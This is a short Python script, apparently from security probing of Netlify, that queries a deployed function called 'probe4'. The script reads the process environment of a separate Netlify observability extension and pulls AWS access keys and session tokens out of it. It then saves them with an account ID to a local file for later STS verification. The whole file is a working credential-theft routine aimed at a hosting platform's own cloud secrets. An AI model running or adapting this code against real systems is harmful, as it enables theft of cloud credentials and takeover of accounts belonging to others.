# -*- coding: utf-8 -*-
"""重抓 probe4 -> proc2 extension 新鲜凭据 -> 存 creds3 -> sts 验证"""
import http.client, ssl, json, re, sys
base = r'D:\scan\netlify_report'
ctx = ssl.create_default_context()

conn = http.client.HTTPSConnection('sec-test-rcf6lz.netlify.app', context=ctx, timeout=90)
conn.request('GET', '/.netlify/functions/probe4', headers={'Accept': 'application/json'})
r = conn.getresponse()
raw = r.read()
st = r.status
conn.close()
print('status:', st, 'len:', len(raw))
if st != 200:
    print(raw[:300].decode('utf-8', 'replace'))
    sys.exit(1)

d = json.loads(raw.decode('utf-8', 'replace'))
env = d.get('proc2', {}).get('environ', '')
print('proc2 environ len:', len(env))
if not env:
    print('no proc2 environ; keys:', list(d.keys()))
    sys.exit(1)

def grab(name):
    m = re.search(name + r'=([^|]+)', env)
    return m.group(1) if m else None

ak, sk, stk = grab('AWS_ACCESS_KEY_ID'), grab('AWS_SECRET_ACCESS_KEY'), grab('AWS_SESSION_TOKEN')
print('AK:', ak)
if ak and sk and stk:
    out = {'access_key': ak, 'secret_key': sk, 'session_token': stk,
           'account': '706019798846', 'region': 'us-east-2', 'source': 'proc2-netlify-observability-extension-fresh'}
    json.dump(out, open(base + r'\_aws_creds3.json', 'w'), indent=1)
    print('saved fresh _aws_creds3.json')
else:
    print('missing keys; environ head:', env[:300])
